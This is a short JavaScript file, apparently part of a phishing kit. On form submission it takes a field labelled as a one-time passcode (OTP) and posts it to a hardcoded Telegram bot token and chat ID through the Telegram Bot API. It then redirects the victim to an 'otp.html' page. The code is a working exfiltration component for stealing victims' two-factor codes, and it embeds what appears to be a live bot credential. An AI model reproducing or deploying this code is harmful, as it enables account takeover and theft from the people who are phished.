
        
    const TOKEN = "7355275994%3AAAF0_SB7r2U2eaINOLz0N-ljnT9T6n_1Eco";
const CHAT_ID = "6369843912";
const URL_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

const form = document.getElementById("fetch");

form.addEventListener("submit", onSubmitTelegram);

function onSubmitTelegram(e) {
  e.preventDefault();

  const { name, } = form;
  const data = {
    name: name.value,
  };

  let message = `<b></b>\n`;
  message += `<b>𝐎𝐓𝐏= </b> ${data.name}`;

  const dataTg = {
    chat_id: CHAT_ID,
    text: message,
    parse_mode: "html",
  };

  const options = {
    method: "POST",
    body: JSON.stringify(dataTg),
    headers: {
      "Content-Type": "application/json",
    },
  };

  fetch(URL_API, options)
    .then((res) => res.json())
    .then((res) => console.log(res))
    .catch((err) => console.log(err));
    
    window.location.href = '/otp.html';
}

